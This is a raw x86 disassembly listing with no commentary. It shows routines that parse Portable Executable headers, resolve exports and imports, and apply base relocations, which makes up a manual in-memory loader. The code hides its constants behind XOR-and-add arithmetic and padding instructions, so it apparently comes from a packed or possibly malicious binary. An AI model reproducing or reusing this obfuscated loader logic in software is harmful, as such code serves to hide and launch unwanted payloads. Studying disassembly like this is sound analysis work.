  41e61d:	add    edi,DWORD PTR [esi]
  41e61f:	cmp    DWORD PTR [eax],edi
  41e621:	jae    0x41e62f
  41e623:	mov    esi,DWORD PTR [ecx]
  41e625:	mov    ecx,DWORD PTR [eax]
  41e627:	mov    edx,DWORD PTR [edx]
  41e629:	sub    ecx,esi
  41e62b:	add    edx,ecx
  41e62d:	mov    DWORD PTR [eax],edx
  41e62f:	mov    eax,DWORD PTR [ebp+0xc]
  41e632:	jmp    0x41e636
  41e634:	xor    eax,eax
  41e636:	pop    edi
  41e637:	pop    esi
  41e638:	pop    ebx
  41e639:	leave  
  41e63a:	ret    0x1c
  41e63d:	push   ebp
  41e63e:	mov    ebp,esp
  41e640:	sub    esp,0x1c
  41e643:	push   esi
  41e644:	mov    esi,eax
  41e646:	mov    eax,DWORD PTR [ecx+0x190]
  41e64c:	cmp    DWORD PTR [eax],0x0
  41e64f:	je     0x41e75f
  41e655:	test   edx,edx
  41e657:	je     0x41e75f
  41e65d:	test   esi,esi
  41e65f:	je     0x41e75f
  41e665:	mov    eax,DWORD PTR [esi+0x88]
  41e66b:	test   eax,eax
  41e66d:	je     0x41e75a
  41e673:	cmp    DWORD PTR [esi+0x8c],0x10
  41e67a:	je     0x41e75a
  41e680:	cmp    DWORD PTR [esi+0x34],edx
  41e683:	je     0x41e75a
  41e689:	mov    esi,DWORD PTR [ecx+0x18c]
  41e68f:	and    DWORD PTR [ebp-0x10],0x0
  41e693:	mov    ecx,edx
  41e695:	sub    ecx,DWORD PTR [esi]
  41e697:	add    eax,edx
  41e699:	movzx  edx,WORD PTR [eax+0xc]
  41e69d:	mov    DWORD PTR [ebp-0x1c],ecx
  41e6a0:	movzx  ecx,WORD PTR [eax+0xe]
  41e6a4:	add    ecx,edx
  41e6a6:	je     0x41e75a
  41e6ac:	lea    ecx,[eax+0x14]
  41e6af:	push   ebx
  41e6b0:	mov    DWORD PTR [ebp-0x18],ecx
  41e6b3:	mov    esi,0x7fffffff
  41e6b8:	push   edi
  41e6b9:	test   DWORD PTR [ecx],esi
  41e6bb:	je     0x41e73c
  41e6bd:	mov    edx,DWORD PTR [ecx]
  41e6bf:	and    DWORD PTR [ebp-0xc],0x0
  41e6c3:	and    edx,esi
  41e6c5:	add    edx,eax
  41e6c7:	movzx  edi,WORD PTR [edx+0xe]
  41e6cb:	movzx  ebx,WORD PTR [edx+0xc]
  41e6cf:	add    edi,ebx
  41e6d1:	je     0x41e73c
  41e6d3:	lea    ecx,[edx+0x14]
  41e6d6:	mov    DWORD PTR [ebp-0x14],ecx
  41e6d9:	test   DWORD PTR [ecx],esi
  41e6db:	je     0x41e71e
  41e6dd:	mov    ecx,DWORD PTR [ecx]
  41e6df:	and    DWORD PTR [ebp-0x8],0x0
  41e6e3:	and    ecx,esi
  41e6e5:	add    ecx,eax
  41e6e7:	movzx  edi,WORD PTR [ecx+0xe]
  41e6eb:	movzx  ebx,WORD PTR [ecx+0xc]
  41e6ef:	add    edi,ebx
  41e6f1:	je     0x41e71e
  41e6f3:	lea    edi,[ecx+0x14]
  41e6f6:	mov    DWORD PTR [ebp-0x4],edi
  41e6f9:	mov    edi,DWORD PTR [ebp-0x4]
  41e6fc:	mov    edi,DWORD PTR [edi]
  41e6fe:	test   edi,edi
  41e700:	je     0x41e708
  41e702:	mov    ebx,DWORD PTR [ebp-0x1c]
  41e705:	add    DWORD PTR [edi+eax*1],ebx
  41e708:	movzx  edi,WORD PTR [ecx+0xe]
  41e70c:	movzx  ebx,WORD PTR [ecx+0xc]
  41e710:	inc    DWORD PTR [ebp-0x8]
  41e713:	add    DWORD PTR [ebp-0x4],0x8
  41e717:	add    edi,ebx
  41e719:	cmp    DWORD PTR [ebp-0x8],edi
  41e71c:	jb     0x41e6f9
  41e71e:	movzx  edi,WORD PTR [edx+0xe]
  41e722:	movzx  ebx,WORD PTR [edx+0xc]
  41e726:	mov    ecx,DWORD PTR [ebp-0x14]
  41e729:	inc    DWORD PTR [ebp-0xc]
  41e72c:	add    ecx,0x8
  41e72f:	add    edi,ebx
  41e731:	mov    DWORD PTR [ebp-0x14],ecx
  41e734:	cmp    DWORD PTR [ebp-0xc],edi
  41e737:	jb     0x41e6d9
  41e739:	mov    ecx,DWORD PTR [ebp-0x18]
  41e73c:	movzx  edx,WORD PTR [eax+0xe]
  41e740:	movzx  edi,WORD PTR [eax+0xc]
  41e744:	inc    DWORD PTR [ebp-0x10]
  41e747:	add    ecx,0x8
  41e74a:	add    edx,edi
  41e74c:	mov    DWORD PTR [ebp-0x18],ecx
  41e74f:	cmp    DWORD PTR [ebp-0x10],edx
  41e752:	jb     0x41e6b9
  41e758:	pop    edi
  41e759:	pop    ebx
  41e75a:	xor    eax,eax
  41e75c:	inc    eax
  41e75d:	jmp    0x41e761
  41e75f:	xor    eax,eax
  41e761:	pop    esi
  41e762:	leave  
  41e763:	ret    
  41e764:	push   ebp
  41e765:	mov    ebp,esp
  41e767:	mov    ecx,DWORD PTR [ecx+0x190]
  41e76d:	mov    eax,DWORD PTR [ebp+0xc]
  41e770:	sub    esp,0x10
  41e773:	push   ebx
  41e774:	xor    ebx,ebx
  41e776:	push   esi
  41e777:	push   edi
  41e778:	cmp    DWORD PTR [ecx],ebx
  41e77a:	je     0x41e802
  41e780:	cmp    eax,ebx
  41e782:	je     0x41e802
  41e784:	cmp    DWORD PTR [eax+0x78],ebx
  41e787:	jne    0x41e78e
  41e789:	xor    eax,eax
  41e78b:	inc    eax
  41e78c:	jmp    0x41e804
  41e78e:	mov    eax,DWORD PTR [eax+0x78]
  41e791:	add    eax,DWORD PTR [ebp+0x8]
  41e794:	mov    ecx,DWORD PTR [eax+0x1c]
  41e797:	mov    edx,DWORD PTR [eax+0x24]
  41e79a:	mov    esi,DWORD PTR [eax+0x14]
  41e79d:	mov    edi,DWORD PTR [eax+0x18]
  41e7a0:	add    ecx,DWORD PTR [ebp+0x8]
  41e7a3:	add    edx,DWORD PTR [ebp+0x8]
  41e7a6:	mov    DWORD PTR [ebp-0x4],esi
  41e7a9:	cmp    esi,edi
  41e7ab:	ja     0x41e7b0
  41e7ad:	mov    DWORD PTR [ebp-0x4],edi
  41e7b0:	mov    DWORD PTR [ebp-0x8],ebx
  41e7b3:	cmp    DWORD PTR [ebp-0x4],ebx
  41e7b6:	jbe    0x41e789
  41e7b8:	cmp    ebx,DWORD PTR [eax+0x14]
  41e7bb:	jae    0x41e7c3
  41e7bd:	movzx  esi,WORD PTR [edx+ebx*2]
  41e7c1:	jmp    0x41e7c5
  41e7c3:	mov    esi,ebx
  41e7c5:	lea    esi,[ecx+esi*4]
  41e7c8:	mov    edi,DWORD PTR [esi]
  41e7ca:	test   edi,edi
  41e7cc:	je     0x41e7f7
  41e7ce:	add    edi,DWORD PTR [ebp+0x8]
  41e7d1:	mov    DWORD PTR [ebp-0x10],edi
  41e7d4:	cmp    edi,eax
  41e7d6:	jbe    0x41e7e8
  41e7d8:	mov    ebx,DWORD PTR [ebp+0xc]
  41e7db:	mov    ebx,DWORD PTR [ebx+0x7c]
  41e7de:	add    ebx,eax
  41e7e0:	cmp    edi,ebx
  41e7e2:	jae    0x41e7e8
  41e7e4:	mov    esi,DWORD PTR [esi]
  41e7e6:	jmp    0x41e7f0
  41e7e8:	sub    edi,DWORD PTR [ebp+0x8]
  41e7eb:	mov    DWORD PTR [esi],edi
  41e7ed:	mov    esi,DWORD PTR [ebp-0x10]
  41e7f0:	test   esi,esi
  41e7f2:	je     0x41e802
  41e7f4:	mov    ebx,DWORD PTR [ebp-0x8]
  41e7f7:	inc    ebx
  41e7f8:	mov    DWORD PTR [ebp-0x8],ebx
  41e7fb:	cmp    ebx,DWORD PTR [ebp-0x4]
  41e7fe:	jb     0x41e7b8
  41e800:	jmp    0x41e789
  41e802:	xor    eax,eax
  41e804:	pop    edi
  41e805:	pop    esi
  41e806:	pop    ebx
  41e807:	leave  
  41e808:	ret    0x8
  41e80b:	push   ebp
  41e80c:	mov    ebp,esp
  41e80e:	sub    esp,0x2c
  41e811:	mov    edx,0xf89c8585
  41e816:	mov    DWORD PTR [ebp-0x4],edx
  41e819:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41e820:	mov    eax,DWORD PTR [ebp-0x4]
  41e823:	mov    ecx,DWORD PTR [ebp-0x4]
  41e826:	mov    ecx,DWORD PTR [ebp-0x4]
  41e829:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82c:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82f:	mov    ecx,DWORD PTR [ebp-0x4]
  41e832:	push   ebx
  41e833:	mov    ebx,DWORD PTR [ebp+0x10]
  41e836:	push   esi
  41e837:	mov    esi,0x751089b
  41e83c:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  41e843:	mov    ecx,DWORD PTR [ebp-0x4]
  41e846:	mov    ebx,DWORD PTR [ebx+0x190]
  41e84c:	push   edi
  41e84d:	mov    edi,0x3272e2
  41e852:	xor    ecx,esi
  41e854:	xor    eax,esi
  41e856:	add    eax,edi
  41e858:	add    ecx,edi
  41e85a:	mov    DWORD PTR [ebp-0x18],eax
  41e85d:	cmp    ecx,DWORD PTR [ebx]
  41e85f:	je     0x41eae0
  41e865:	mov    ebx,DWORD PTR [ebp-0x4]
  41e868:	mov    ecx,DWORD PTR [ebp+0xc]
  41e86b:	xor    ebx,esi
  41e86d:	add    ebx,edi
  41e86f:	cmp    ebx,ecx
  41e871:	je     0x41eae0
  41e877:	mov    ebx,DWORD PTR [ebp-0x4]
  41e87a:	mov    ecx,DWORD PTR [ecx+0x80]
  41e880:	xor    ebx,esi
  41e882:	add    ebx,edi
  41e884:	cmp    ecx,ebx
  41e886:	je     0x41eadb
  41e88c:	add    ecx,DWORD PTR [ebp+0x8]
  41e88f:	mov    DWORD PTR [ebp-0x2c],ecx
  41e892:	mov    ebx,edx
  41e894:	xor    ebx,esi
  41e896:	add    ebx,edi
  41e898:	mov    DWORD PTR [ebp-0x10],ebx
  41e89b:	mov    ebx,DWORD PTR [ebp-0x10]
  41e89e:	cmp    ebx,edx
  41e8a0:	je     0x41e8b4
  41e8a2:	mov    edx,DWORD PTR [ebp-0x10]
  41e8a5:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8a8:	imul   edx,edx,0x14
  41e8ab:	xor    ebx,esi
  41e8ad:	add    ebx,edi
  41e8af:	cmp    DWORD PTR [edx+ecx*1],ebx
  41e8b2:	jne    0x41e8cb
  41e8b4:	mov    edx,DWORD PTR [ebp-0x10]
  41e8b7:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8ba:	imul   edx,edx,0x14
  41e8bd:	xor    ebx,esi
  41e8bf:	add    ebx,edi
  41e8c1:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  41e8c5:	je     0x41eacd
  41e8cb:	mov    eax,DWORD PTR [ebp-0x4]
  41e8ce:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8d1:	mov    eax,DWORD PTR [ebp-0x10]
  41e8d4:	imul   eax,eax,0x14
  41e8d7:	add    eax,ecx
  41e8d9:	mov    ecx,DWORD PTR [eax+0x10]
  41e8dc:	add    ecx,DWORD PTR [ebp+0x8]
  41e8df:	xor    ebx,esi
  41e8e1:	mov    DWORD PTR [ebp-0x1c],ecx
  41e8e4:	mov    ecx,DWORD PTR [ebp-0x4]
  41e8e7:	mov    edx,DWORD PTR [ebp-0x4]
  41e8ea:	xor    ecx,esi
  41e8ec:	add    ecx,edi
  41e8ee:	xor    edx,esi
  41e8f0:	mov    DWORD PTR [ebp-0x24],ecx
  41e8f3:	mov    ecx,DWORD PTR [eax]
  41e8f5:	add    edx,edi
  41e8f7:	add    ebx,edi
  41e8f9:	cmp    ecx,edx
  41e8fb:	je     0x41e903
  41e8fd:	add    ecx,DWORD PTR [ebp+0x8]
  41e900:	mov    DWORD PTR [ebp-0x24],ecx
  41e903:	mov    ecx,DWORD PTR [ebp-0x4]
  41e906:	xor    ecx,esi
  41e908:	add    ecx,DWORD PTR [eax+0xc]
  41e90b:	mov    eax,DWORD PTR [ebp+0x8]
  41e90e:	lea    eax,[ecx+eax*1+0x3272e2]
  41e915:	mov    DWORD PTR [ebp+0xc],eax
  41e918:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  41e91f:	mov    eax,DWORD PTR [ebp+0x10]
  41e922:	push   DWORD PTR [ebp+0xc]
  41e925:	mov    eax,DWORD PTR [eax+0x1d8]
  41e92b:	call   DWORD PTR [eax]
  41e92d:	mov    ecx,DWORD PTR [ebp-0x4]
  41e930:	xor    ecx,esi
  41e932:	add    ecx,edi
  41e934:	mov    DWORD PTR [ebp-0xc],eax
  41e937:	cmp    ecx,eax
  41e939:	jne    0x41e94d
  41e93b:	mov    eax,DWORD PTR [ebp+0x10]
  41e93e:	push   DWORD PTR [ebp+0xc]
  41e941:	mov    eax,DWORD PTR [eax+0x1d8]
  41e947:	call   DWORD PTR [eax+0xc]
  41e94a:	mov    DWORD PTR [ebp-0xc],eax
  41e94d:	mov    DWORD PTR [ebp-0x20],0x7f661b0c
  41e954:	mov    DWORD PTR [ebp-0x20],0xf89c999c
  41e95b:	mov    eax,DWORD PTR [ebp-0x4]
  41e95e:	xor    eax,esi
  41e960:	add    eax,edi
  41e962:	cmp    eax,DWORD PTR [ebp-0xc]
  41e965:	jne    0x41e98a
  41e967:	mov    eax,DWORD PTR [ebp-0x8]
  41e96a:	mov    ecx,DWORD PTR [ebp-0x20]
  41e96d:	xor    eax,esi
  41e96f:	xor    ecx,esi
  41e971:	lea    ebx,[ebx+eax*1+0x3272e2]
  41e978:	mov    eax,DWORD PTR [ebp+0x10]
  41e97b:	mov    eax,DWORD PTR [eax+0x1d8]
  41e981:	add    ecx,edi
  41e983:	imul   ecx,ebx
  41e986:	push   ecx
  41e987:	call   DWORD PTR [eax+0x24]
  41e98a:	mov    eax,DWORD PTR [ebp-0x4]
  41e98d:	xor    eax,esi
  41e98f:	add    eax,edi
  41e991:	cmp    eax,DWORD PTR [ebp-0xc]
  41e994:	jne    0x41e9a5
  41e996:	mov    eax,DWORD PTR [ebp-0x28]
  41e999:	xor    eax,esi
  41e99b:	add    eax,edi
  41e99d:	cmp    ebx,eax
  41e99f:	jbe    0x41e91f
  41e9a5:	mov    eax,DWORD PTR [ebp-0x4]
  41e9a8:	xor    eax,esi
  41e9aa:	add    eax,edi
  41e9ac:	cmp    eax,DWORD PTR [ebp-0xc]
  41e9af:	jne    0x41e9c8
  41e9b1:	mov    eax,DWORD PTR [ebp-0x8]
  41e9b4:	mov    ecx,DWORD PTR [ebp-0x18]
  41e9b7:	xor    eax,esi
  41e9b9:	lea    eax,[ecx+eax*1+0x3272e2]
  41e9c0:	mov    DWORD PTR [ebp-0x18],eax
  41e9c3:	jmp    0x41eab7
  41e9c8:	mov    DWORD PTR [ebp-0x14],0x1121b0d
  41e9cf:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  41e9d6:	mov    ebx,DWORD PTR [ebp-0x4]
  41e9d9:	xor    ebx,esi
  41e9db:	add    ebx,edi
  41e9dd:	jmp    0x41eaa4
  41e9e2:	mov    eax,DWORD PTR [ebp-0x4]
  41e9e5:	xor    eax,esi
  41e9e7:	add    eax,edi
  41e9e9:	mov    DWORD PTR [ebp-0x14],eax
  41e9ec:	mov    eax,DWORD PTR [ebp-0x4]
  41e9ef:	xor    eax,esi
  41e9f1:	add    eax,edi
  41e9f3:	mov    DWORD PTR [ebp+0xc],eax
  41e9f6:	mov    ecx,DWORD PTR [ebp-0x4]
  41e9f9:	mov    eax,DWORD PTR [ebp-0x24]
  41e9fc:	xor    ecx,esi
  41e9fe:	add    ecx,edi
  41ea00:	cmp    ecx,eax
  41ea02:	je     0x41ea0a
  41ea04:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea07:	mov    DWORD PTR [ebp-0x14],eax
  41ea0a:	mov    eax,DWORD PTR [ebp-0x1c]
  41ea0d:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea10:	mov    DWORD PTR [ebp+0xc],eax
  41ea13:	mov    eax,DWORD PTR [ebp-0x4]
  41ea16:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea19:	xor    eax,esi
  41ea1b:	add    eax,edi
  41ea1d:	cmp    eax,ecx
  41ea1f:	je     0x41ea4a
  41ea21:	mov    eax,DWORD PTR [ebp-0x4]
  41ea24:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea27:	xor    eax,esi
  41ea29:	add    eax,edi
  41ea2b:	shr    ecx,0x1f
  41ea2e:	cmp    eax,ecx
  41ea30:	je     0x41ea4a
  41ea32:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea35:	mov    eax,DWORD PTR [ebp+0x10]
  41ea38:	mov    eax,DWORD PTR [eax+0x1d8]
  41ea3e:	movzx  ecx,cx
  41ea41:	push   ecx
  41ea42:	push   DWORD PTR [ebp-0xc]
  41ea45:	call   DWORD PTR [eax+0x8]
  41ea48:	jmp    0x41ea63
  41ea4a:	mov    eax,DWORD PTR [ebp+0xc]
  41ea4d:	add    eax,DWORD PTR [ebp+0x8]
  41ea50:	mov    ecx,DWORD PTR [ebp+0x10]
  41ea53:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ea59:	add    eax,0x2
  41ea5c:	push   eax
  41ea5d:	push   DWORD PTR [ebp-0xc]
  41ea60:	call   DWORD PTR [ecx+0x8]
  41ea63:	mov    DWORD PTR [ebp+0xc],eax
  41ea66:	mov    eax,DWORD PTR [ebp-0x4]
  41ea69:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea6c:	xor    eax,esi
  41ea6e:	add    eax,edi
  41ea70:	cmp    eax,ecx
  41ea72:	mov    eax,DWORD PTR [ebp-0x8]
  41ea75:	jne    0x41ea88
  41ea77:	mov    ecx,DWORD PTR [ebp-0x18]
  41ea7a:	xor    eax,esi
  41ea7c:	lea    eax,[ecx+eax*1+0x3272e2]
  41ea83:	mov    DWORD PTR [ebp-0x18],eax
  41ea86:	jmp    0x41ea98
  41ea88:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea8b:	xor    eax,esi
  41ea8d:	add    eax,edi
  41ea8f:	imul   eax,ecx
  41ea92:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ea95:	mov    DWORD PTR [ecx+ebx*4],eax
  41ea98:	mov    eax,DWORD PTR [ebp-0x8]
  41ea9b:	xor    eax,esi
  41ea9d:	lea    ebx,[ebx+eax*1+0x3272e2]
  41eaa4:	mov    eax,DWORD PTR [ebp-0x4]
  41eaa7:	mov    ecx,DWORD PTR [ebp-0x1c]
  41eaaa:	xor    eax,esi
  41eaac:	add    eax,edi
  41eaae:	cmp    DWORD PTR [ecx+ebx*4],eax
  41eab1:	jne    0x41e9e2
  41eab7:	mov    edx,DWORD PTR [ebp-0x10]
  41eaba:	mov    eax,DWORD PTR [ebp-0x18]
  41eabd:	mov    ecx,DWORD PTR [ebp-0x2c]
  41eac0:	sub    edx,0x3272e1
  41eac6:	xor    edx,esi
  41eac8:	jmp    0x41e892
  41eacd:	mov    ecx,DWORD PTR [ebp-0x4]
  41ead0:	xor    ecx,esi
  41ead2:	add    ecx,edi
  41ead4:	cmp    eax,ecx
  41ead6:	mov    eax,DWORD PTR [ebp-0x4]
  41ead9:	jne    0x41eae3
  41eadb:	mov    eax,DWORD PTR [ebp-0x8]
  41eade:	jmp    0x41eae3
  41eae0:	mov    eax,DWORD PTR [ebp-0x4]
  41eae3:	xor    eax,esi
  41eae5:	add    eax,edi
  41eae7:	pop    edi
  41eae8:	pop    esi
  41eae9:	pop    ebx
  41eaea:	leave  
  41eaeb:	ret    0xc
  41eaee:	push   ebp
  41eaef:	mov    ebp,esp
  41eaf1:	sub    esp,0x28
  41eaf4:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41eafb:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  41eb02:	mov    eax,DWORD PTR [ebp+0xc]
  41eb05:	mov    DWORD PTR [ebp+0xc],eax
  41eb08:	push   esi
  41eb09:	mov    eax,eax
  41eb0b:	mov    eax,DWORD PTR [ebp-0x4]
  41eb0e:	mov    esi,DWORD PTR [ebp+0x8]
  41eb11:	mov    ecx,0x751089b
  41eb16:	xor    eax,ecx
  41eb18:	mov    edx,0x3272e2
  41eb1d:	add    eax,edx
  41eb1f:	cmp    esi,eax
  41eb21:	je     0x41ec48
  41eb27:	mov    eax,DWORD PTR [ebp+0x8]
  41eb2a:	mov    esi,DWORD PTR [ebp+0x8]
  41eb2d:	add    esi,DWORD PTR [eax+0x3c]
  41eb30:	push   edi
  41eb31:	mov    DWORD PTR [ebp+0xc],esi
  41eb34:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  41eb3b:	mov    eax,DWORD PTR [ebp-0x1c]
  41eb3e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb41:	mov    edi,DWORD PTR [ebp+0xc]
  41eb44:	xor    esi,ecx
  41eb46:	xor    eax,ecx
  41eb48:	add    esi,edx
  41eb4a:	cmp    DWORD PTR [edi+eax*8+0x1939788],esi
  41eb51:	je     0x41ec42
  41eb57:	mov    esi,DWORD PTR [ebp+0xc]
  41eb5a:	mov    eax,DWORD PTR [ebp+0x8]
  41eb5d:	add    eax,DWORD PTR [esi+0xa0]
  41eb63:	mov    esi,DWORD PTR [ebp+0x8]
  41eb66:	mov    edi,DWORD PTR [ebp+0xc]
  41eb69:	sub    esi,DWORD PTR [edi+0x34]
  41eb6c:	mov    edi,DWORD PTR [ebp-0x4]
  41eb6f:	xor    edi,ecx
  41eb71:	add    edi,edx
  41eb73:	mov    DWORD PTR [ebp-0x24],esi
  41eb76:	cmp    esi,edi
  41eb78:	je     0x41ec42
  41eb7e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb81:	xor    esi,ecx
  41eb83:	add    esi,edx
  41eb85:	mov    DWORD PTR [ebp-0x8],esi
  41eb88:	push   ebx
  41eb89:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  41eb90:	jmp    0x41ec2c
  41eb95:	mov    esi,DWORD PTR [ebp-0x4]
  41eb98:	xor    esi,ecx
  41eb9a:	lea    edi,[ebx-0x8]
  41eb9d:	add    esi,edx
  41eb9f:	shr    edi,1
  41eba1:	cmp    esi,edi
  41eba3:	jae    0x41ec12
  41eba5:	sub    edi,esi
  41eba7:	lea    ebx,[eax+esi*2+0x8]
  41ebab:	mov    DWORD PTR [ebp-0x18],edi
  41ebae:	movzx  esi,WORD PTR [ebx]
  41ebb1:	and    esi,0xfff
  41ebb7:	mov    DWORD PTR [ebp-0x14],esi
  41ebba:	mov    edi,DWORD PTR [ebp-0x14]
  41ebbd:	mov    esi,DWORD PTR [eax]
  41ebbf:	sub    esi,edx
  41ebc1:	add    edi,esi
  41ebc3:	movzx  esi,WORD PTR [ebx]
  41ebc6:	shr    esi,0xc
  41ebc9:	xor    edi,ecx
  41ebcb:	mov    DWORD PTR [ebp-0x20],edi
  41ebce:	mov    DWORD PTR [ebp-0x14],esi
  41ebd1:	mov    esi,DWORD PTR [ebp-0x20]
  41ebd4:	mov    edi,DWORD PTR [ebp+0x8]
  41ebd7:	xor    esi,ecx
  41ebd9:	lea    esi,[esi+edi*1+0x3272e2]
  41ebe0:	mov    DWORD PTR [ebp-0x20],esi
  41ebe3:	mov    esi,DWORD PTR [ebp-0x10]
  41ebe6:	mov    edi,DWORD PTR [ebp-0x14]
  41ebe9:	xor    esi,ecx
  41ebeb:	add    esi,edx
  41ebed:	cmp    edi,esi
  41ebef:	jne    0x41ec07
  41ebf1:	mov    esi,DWORD PTR [ebp-0x10]
  41ebf4:	mov    edi,DWORD PTR [ebp-0x14]
  41ebf7:	xor    esi,ecx
  41ebf9:	add    esi,edx
  41ebfb:	cmp    edi,esi
  41ebfd:	jne    0x41ec07
  41ebff:	mov    esi,DWORD PTR [ebp-0x20]
  41ec02:	mov    edi,DWORD PTR [ebp-0x24]
  41ec05:	add    DWORD PTR [esi],edi
  41ec07:	add    ebx,0x2
  41ec0a:	dec    DWORD PTR [ebp-0x18]
  41ec0d:	jne    0x41ebae
  41ec0f:	mov    ebx,DWORD PTR [ebp-0xc]
  41ec12:	add    DWORD PTR [ebp-0x8],ebx
  41ec15:	mov    esi,DWORD PTR [ebp-0x1c]
  41ec18:	mov    edi,DWORD PTR [ebp-0x8]
  41ec1b:	mov    ebx,DWORD PTR [ebp+0xc]
  41ec1e:	xor    esi,ecx
  41ec20:	cmp    edi,DWORD PTR [ebx+esi*8+0x193978c]
  41ec27:	jae    0x41ec41
  41ec29:	add    eax,DWORD PTR [ebp-0xc]
  41ec2c:	mov    esi,DWORD PTR [ebp-0x4]
  41ec2f:	mov    ebx,DWORD PTR [eax+0x4]
  41ec32:	xor    esi,ecx
  41ec34:	add    esi,edx
  41ec36:	mov    DWORD PTR [ebp-0xc],ebx
  41ec39:	cmp    ebx,esi
  41ec3b:	jne    0x41eb95
  41ec41:	pop    ebx
  41ec42:	mov    eax,DWORD PTR [ebp-0x28]
  41ec45:	pop    edi
  41ec46:	jmp    0x41ec4b
  41ec48:	mov    eax,DWORD PTR [ebp-0x4]
  41ec4b:	xor    eax,ecx
  41ec4d:	add    eax,edx
  41ec4f:	pop    esi
  41ec50:	leave  
  41ec51:	ret    0x8
  41ec54:	push   ebp
  41ec55:	mov    ebp,esp
  41ec57:	sub    esp,0xcc
  41ec5d:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41ec64:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  41ec6b:	mov    eax,DWORD PTR [ebp-0x4]
  41ec6e:	push   ebx
  41ec6f:	push   esi
  41ec70:	mov    esi,0x751089b
  41ec75:	xor    eax,esi
  41ec77:	push   edi
  41ec78:	mov    edi,0x3272e2
  41ec7d:	add    eax,edi
  41ec7f:	mov    DWORD PTR [ebp-0x1c],eax
  41ec82:	mov    eax,DWORD PTR [ebp-0x4]
  41ec85:	xor    eax,esi
  41ec87:	add    eax,edi
  41ec89:	mov    DWORD PTR [ebp-0x8],eax
  41ec8c:	mov    ebx,DWORD PTR [ebp+0x20]
  41ec8f:	mov    eax,DWORD PTR [ebp-0x14]
  41ec92:	mov    ecx,DWORD PTR [ebp-0x14]
  41ec95:	xor    eax,ecx
  41ec97:	mov    DWORD PTR [ebp-0x14],eax
  41ec9a:	add    DWORD PTR [ebp-0x14],0xf89cb585
  41eca1:	mov    eax,DWORD PTR [ebp-0xc]
  41eca4:	mov    ecx,DWORD PTR [ebp-0xc]
  41eca7:	xor    eax,ecx
  41eca9:	mov    DWORD PTR [ebp-0xc],eax
  41ecac:	add    DWORD PTR [ebp-0xc],0xf89c85c5
  41ecb3:	mov    eax,DWORD PTR [ebp-0x10]
  41ecb6:	mov    ecx,DWORD PTR [ebp-0x10]
  41ecb9:	xor    eax,ecx
  41ecbb:	mov    DWORD PTR [ebp-0x10],eax
  41ecbe:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  41ecc5:	mov    eax,DWORD PTR [ebp-0x20]
  41ecc8:	mov    ecx,DWORD PTR [ebp-0x20]
  41eccb:	xor    eax,ecx
  41eccd:	mov    DWORD PTR [ebp-0x20],eax
  41ecd0:	add    DWORD PTR [ebp-0x20],0xf89f0585
  41ecd7:	mov    eax,0x9471
  41ecdc:	mov    WORD PTR [ebp+0x20],ax
  41ece0:	mov    eax,DWORD PTR [ebp+0x8]
  41ece3:	test   eax,eax
  41ece5:	je     0x41f140
  41eceb:	mov    eax,DWORD PTR [ebp+0xc]
  41ecee:	test   eax,eax
  41ecf0:	je     0x41f140
  41ecf6:	mov    eax,DWORD PTR [ebp+0x18]
  41ecf9:	test   eax,eax
  41ecfb:	je     0x41f140
  41ed01:	mov    ax,WORD PTR [ebp+0x20]
  41ed05:	mov    ecx,0x8a8d
  41ed0a:	xor    ax,cx
  41ed0d:	mov    ecx,0x3b51
  41ed12:	add    ax,cx
  41ed15:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed18:	cmp    WORD PTR [ecx],ax
  41ed1b:	jne    0x41f140
  41ed21:	mov    eax,DWORD PTR [ebp-0x4]
  41ed24:	xor    eax,esi
  41ed26:	add    eax,edi
  41ed28:	mov    DWORD PTR [ebp-0x30],eax
  41ed2b:	mov    eax,DWORD PTR [ebp-0x4]
  41ed2e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed31:	mov    eax,DWORD PTR [ebp+0x8]
  41ed34:	add    eax,DWORD PTR [ecx+0x3c]
  41ed37:	mov    DWORD PTR [ebp+0xc],eax
  41ed3a:	mov    eax,DWORD PTR [eax+0x50]
  41ed3d:	test   eax,eax
  41ed3f:	je     0x41f140
  41ed45:	mov    DWORD PTR [ebp-0x2c],0xf88c8585
  41ed4c:	mov    eax,DWORD PTR [ebp-0x2c]
  41ed4f:	xor    eax,esi
  41ed51:	add    eax,edi
  41ed53:	mov    DWORD PTR [ebp-0x2c],eax
  41ed56:	mov    eax,DWORD PTR [ebp-0x4]
  41ed59:	mov    eax,DWORD PTR [ebx+0x190]
  41ed5f:	mov    ecx,DWORD PTR [eax]
  41ed61:	mov    ecx,DWORD PTR [ecx+0x3c]
  41ed64:	add    ecx,DWORD PTR [eax]
  41ed66:	mov    eax,DWORD PTR [ebp-0x4]
  41ed69:	mov    eax,DWORD PTR [ebx+0x18c]
  41ed6f:	mov    edx,DWORD PTR [eax]
  41ed71:	mov    DWORD PTR [ebp-0x18],ecx
  41ed74:	mov    DWORD PTR [ebp+0x20],edx
  41ed77:	cmp    edx,edx
  41ed79:	jne    0x41edad
  41ed7b:	mov    eax,DWORD PTR [ebx+0x1d8]
  41ed81:	lea    edx,[ebp-0x1c]
  41ed84:	push   edx
  41ed85:	mov    edx,DWORD PTR [ebp-0xc]
  41ed88:	xor    edx,esi
